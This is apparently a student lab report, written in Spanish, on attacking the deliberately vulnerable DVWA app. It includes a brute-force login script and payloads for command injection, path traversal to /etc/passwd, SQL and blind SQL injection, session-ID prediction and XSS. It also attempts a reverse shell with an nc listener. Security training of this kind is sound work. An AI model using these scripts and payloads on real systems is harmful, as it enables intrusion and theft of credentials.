# DVWA - Práctica

## 📋 Descripción

Esta práctica consiste en realizar un ataque de fuerza bruta a la aplicación **DVWA (Damn Vulnerable Web App)** para romper la autenticación de los diferentes módulos utilizando un script en Python y el diccionario `rockyou.txt`.

## 🛠️ Entorno de trabajo

- **Sistema Operativo**: Linux Mint 21
- **Aplicación objetivo**: DVWA (Damn Vulnerable Web App)
- **IP DVWA**: `172.17.0.2` (localhost)
- **Lenguaje del script**: Python 3
- **Herramientas utilizadas**:
  - Python 3
  - Librerías `requests` y `BeautifulSoup`
  - Diccionario `rockyou.txt`

## ⚙️ Configuración inicial

- **Estado de seguridad de DVWA**: `High`
- **Configuración de la base de datos**: Correcta
- **Observaciones**: Se requiere el token `user_token` en cada petición.

![Setup DVWA](assets/1-DVWAsetup.PNG)

## 🧩 Script de Fuerza Bruta

El script realiza las siguientes acciones:
- Establece una sesión usando cookies para seguridad alta.
- Obtiene dinámicamente el `user_token` necesario para cada intento.
- Prueba contraseñas del diccionario `rockyou.txt` una a una.
- Detecta el éxito cuando encuentra el mensaje `Welcome`.

Fragmento del script:

```python
import requests
from bs4 import BeautifulSoup
from requests.structures import CaseInsensitiveDict

url = 'http://172.17.0.2/vulnerabilities/brute/'
headers = CaseInsensitiveDict()
headers["Cookie"] = "security=high; PHPSESSID=rqs9b9elru16hltg6gvagkek195"

r = requests.get(url, headers=headers)
r1 = r.content
soup = BeautifulSoup(r1, 'html.parser')
user_token = soup.findAll('input', attrs={'name': 'user_token'})[0]['value']

with open('rockyou.txt', 'rb') as f:
    for i in f.readlines():
        i = i[:-1]
        try:
            al = i.decode()
        except UnicodeDecodeError:
            print(f"can't decode {i}")
            continue

        r = requests.get(f'http://127.0.0.1/vulnerabilities/brute/?username=admin&password={al}&Login=Login&user_token={user_token}#', headers=headers)
        r1 = r.content
        soup1 = BeautifulSoup(r1, 'html.parser')
        user_token = soup1.findAll('input', attrs={'name': 'user_token'})[0]['value']
        
        print(f'checking {al}')
        if 'Welcome' in r.text:
            print(f'LoggedIn: username: admin , password:{al}   ===found===')
            break
```
## ✅ Resultado

El ataque fue exitoso: se encontró la combinación correcta de usuario y contraseña.

Resultado obtenido en la ejecución:

<p align="center">
  <img src="assets/3-BruteForceResultado.PNG" alt="Resultado Bruteforce" width="600">
</p>

## 🧩 Command Injection

En este módulo de DVWA se explota una vulnerabilidad de **inyección de comandos** en el parámetro usado para hacer ping a una IP.

### 🔍 Acciones realizadas:

- Se accedió al apartado **Command Injection** en DVWA.
- En el campo “Enter an IP address” se introdujo un comando malicioso: `localhost | ls`
- Esto permite inyectar un segundo comando (`ls`) y ejecutar código arbitrario en el sistema.

### 💡 Comando utilizado: localhost | ls

Esto ejecuta el ping a `localhost`, y luego el comando `ls` que lista el contenido del directorio actual del servidor.

### 📷 Captura del ataque:

<p align="center">
  <img src="assets/4-CommandInjection.PNG" alt="Command Injection en DVWA" width="600">
</p>

## ✅ Resultado

Se observó que la aplicación ejecutó correctamente ambos comandos (`ping` y `ls`), mostrando la salida del segundo dentro del navegador, lo que confirma la vulnerabilidad.

## 🧩 File Inclusion

En este módulo se explota una vulnerabilidad de **inclusión de archivos locales (LFI)**, que permite al atacante leer archivos del sistema al manipular una variable que apunta a archivos.

### 🔍 Acciones realizadas:

- Se accedió al módulo **File Inclusion** en DVWA.
- En la URL se modificó el parámetro `page` para intentar acceder a archivos sensibles del sistema.
- Se utilizó una secuencia de directorios para escalar hasta la raíz y acceder al archivo `/etc/passwd`.

### 💡 Inyección utilizada:

http://172.17.0.2/vulnerabilities/fi/?page=../../../../../../etc/passwd


Esta ruta accede al archivo de contraseñas del sistema Linux, que enumera todos los usuarios registrados.

### 📷 Captura del ataque:

<p align="center">
  <img src="assets/5-FileInclusion.PNG" alt="File Inclusion DVWA" width="700">
</p>

## ✅ Resultado

Se obtuvo correctamente el contenido del archivo `/etc/passwd`, lo cual demuestra que el parámetro vulnerable permite incluir archivos arbitrarios del sistema.

Esto es una vulnerabilidad crítica, ya que permite al atacante conocer usuarios del sistema e incluso combinarse con ejecución remota de código si se incluyen archivos con contenido malicioso.

## 🧩 File Upload + File Inclusion

Este módulo permite probar vulnerabilidades asociadas a la **subida insegura de archivos**. Aprovechando esto, se intenta subir un archivo malicioso que, combinado con **File Inclusion**, permita ejecutar una reverse shell.

### 🔍 Acciones realizadas

1. Se creó un archivo PHP camuflado como imagen (`rev.php.png`) que contiene una reverse shell:

![Archivo PHP para Reverse Shell](assets/6-UploadArchivoPHP.PNG)

2. Se subió el archivo desde el módulo **File Upload**. DVWA aceptó la carga indicando que fue exitosamente guardado:

![Archivo Subido](assets/7-UploadArchivoSubido.PNG)

3. Se intentó acceder al archivo usando **File Inclusion** para forzar su ejecución desde la ruta:

http://172.17.0.2/vulnerabilities/fi/?page=../../../../hackable/uploads/rev.php.png


4. Mientras tanto, se dejó escuchando una conexión inversa con `netcat` en el puerto 9001:

```bash
nc -lvnp 9001

````
### ⚠️ Nota

Aunque el procedimiento fue correcto, **no se logró establecer la reverse shell**. Posibles causas:

- El archivo `.php.png` no fue ejecutado como PHP por el servidor.
- El servidor puede tener protecciones contra ejecución de archivos subidos.
- Faltó modificar la configuración de DVWA o del servidor para permitir ejecución de archivos `.php`.

### ✅ Resultado

La prueba demuestra que, si el servidor no valida extensiones y contenido correctamente, un atacante puede subir código malicioso.  
Aunque no se obtuvo acceso remoto en este caso, la vulnerabilidad de **subida no restringida + inclusión de archivos** es crítica.

## 🧩 SQL Injection

Este módulo de DVWA permite probar vulnerabilidades de **inyección de código SQL**, que se producen cuando el servidor no filtra correctamente la entrada de usuario antes de ejecutar consultas en la base de datos.

### 🔍 Acciones realizadas

1. Se accedió al módulo **SQL Injection**.
2. En el campo de entrada se utilizó el siguiente payload para realizar una inyección SQL:
   ' UNION SELECT user, password FROM users#
3. El objetivo del payload es modificar la consulta original para que devuelva los usuarios y contraseñas de la tabla `users`, ignorando el resto de la sentencia con `#`.

4. La aplicación devolvió una lista de nombres de usuario y hashes de contraseñas, lo que confirma la vulnerabilidad.

![Setup DVWA](assets/9-SQLInjection.PNG)

## 🧩 Blind SQL Injection

Este módulo permite explotar una **inyección SQL ciega**, donde no se recibe respuesta directa del servidor, pero es posible inferir información a partir del comportamiento o contenido de la respuesta.

### 🔍 Acciones realizadas

1. Se desarrolló un script en Python que automatiza la extracción del resultado de la función `version()` de la base de datos mediante inyección SQL en la **cookie** de sesión.

2. La técnica empleada se basa en:

   - Determinar primero la longitud del resultado de `version()`.
   - A continuación, extraer carácter por carácter el valor de la versión, comprobando su correspondencia con cada valor ASCII.

3. La inyección se realiza dentro de la cookie `id`:

id=1' AND length(version())=24#

y luego:

id=1' AND ascii(substring(version(),{pos},1))={ascii_code}#

4. El servidor no muestra el resultado directamente, pero responde con el mensaje “User ID exists in the database” si la condición es verdadera, permitiendo inferir los valores uno a uno.

### 📄 Script utilizado

![Blind SQL Script](assets/10-BlindScript.PNG)

### 💻 Resultado en terminal

![Resultado Blind SQL Injection](assets/11-BlindSQLResultado.PNG)

Se logró extraer correctamente la versión del gestor de base de datos:

10.1.26-MariaDB-0+deb9u1


## ✅ Resultado

La vulnerabilidad fue explotada con éxito mediante técnicas de inferencia, demostrando que incluso sin errores visibles o respuestas directas, se pueden extraer datos sensibles.  
Este tipo de ataque es especialmente grave porque suele pasar desapercibido en auditorías superficiales.

## 🧩 Weak Session IDs

En este módulo de DVWA se estudia una mala práctica relacionada con la **generación predecible de identificadores de sesión (Session IDs)**. Este tipo de vulnerabilidad puede permitir a un atacante predecir o forzar una sesión válida y secuestrar la identidad de otro usuario.

### 🔍 Análisis del código fuente

Al revisar el archivo `high.php` del módulo, se observa el siguiente fragmento en PHP:

![Código de la vulnerabilidad](assets/12-Cookie.PNG)

### 💡 Deducción técnica

1. El valor de la cookie `dvwaSession` no se genera de forma aleatoria, sino que se calcula como:

   md5($_SESSION['last_session_id_high'])

2. La variable `last_session_id_high` simplemente incrementa su valor cada vez que se accede al recurso vía POST:

```php
$_SESSION['last_session_id_high']++;
```
3. Esto implica que los valores de sesión son predecibles: son simplemente el md5 de un contador que empieza en 0.

4. Un atacante podría generar todos los posibles valores de sesión usando un bucle como:

```python
import hashlib

for i in range(1000):
    print(hashlib.md5(str(i).encode()).hexdigest())
```

## ✅ Resultado

Este comportamiento expone al sistema a ataques de predicción de sesión, donde un atacante no necesita fuerza bruta sobre valores aleatorios, sino simplemente conocer el algoritmo (en este caso, md5) y su patrón incremental.
Es un ejemplo claro de cómo una mala implementación en la generación de cookies puede romper la seguridad de la autenticación.

## 🧩 DOM Based XSS (Cross-Site Scripting)

Esta vulnerabilidad se produce cuando el **navegador interpreta contenido peligroso directamente desde el DOM (Document Object Model)**, en lugar de hacerlo desde el servidor. En este caso, el ataque se ejecuta en el lado del cliente, y no hay validación o filtrado por parte del servidor.

### 🔍 Acciones realizadas

1. Se accedió al módulo **XSS (DOM)** de DVWA.
2. Se identificó que el valor de la URL tras el carácter `#` (fragmento) es reflejado e interpretado por el navegador sin ser saneado.
3. Se utilizó el siguiente **payload** para extraer la cookie del usuario:

```html
<script>alert(document.cookie);</script>
```
4. El código malicioso fue inyectado en la URL como parámetro tras el #, lo cual no es enviado al servidor, sino procesado directamente por el navegador.
5. Al cargar la página con el payload, se ejecutó el código JavaScript mostrando en un alert() la cookie de sesión.

### 💡 Payload utilizado

http://172.17.0.2/vulnerabilities/xss_d/?default=English#<script>alert(document.cookie);</script>

## 📷 Captura del ataque

![Vulneración](assets/13-XSSDom.PNG)

## ✅ Resultado

Se comprobó que la aplicación es vulnerable a DOM-Based XSS, lo que permite la ejecución de código malicioso directamente en el navegador de la víctima.
Este tipo de ataque puede ser utilizado para robar cookies, suplantar identidades o realizar acciones en nombre del usuario autenticado sin que el servidor lo detecte.

## 🧩 Reflected XSS (Cross-Site Scripting)

La vulnerabilidad **XSS reflejado** ocurre cuando una aplicación web **refleja directamente datos introducidos por el usuario en la respuesta HTML** sin validarlos o codificarlos adecuadamente. Esto permite inyectar y ejecutar código JavaScript en el navegador de la víctima.

### 🔍 Acciones realizadas

1. Se accedió al módulo **XSS (Reflected)** en DVWA.
2. En el parámetro `name` de la URL, se inyectó código malicioso que fue devuelto sin sanear por el servidor.
3. Se utilizó el siguiente **payload**, el cual utiliza un evento `onerror` en una etiqueta `img` para ejecutar JavaScript:

```html
<img src=x onerror="alert(document.cookie)">
```
4. Este código fue interpretado por el navegador y ejecutado, mostrando en una ventana emergente (alert) la cookie del usuario.
Se ha usado el payload: http://172.17.0.2/vulnerabilities/xss_r/?name=<img src=x onerror="alert(document.cookie)">

![Vulneración](assets/14-XSSReflected.PNG)

## ✅ Resultado
El servidor devolvió sin filtrar el valor del parámetro name, lo que permitió la ejecución de código JavaScript.
Esta vulnerabilidad puede ser aprovechada para robar sesiones, redirigir usuarios, insertar keyloggers o ejecutar otras acciones maliciosas desde enlaces manipulados.
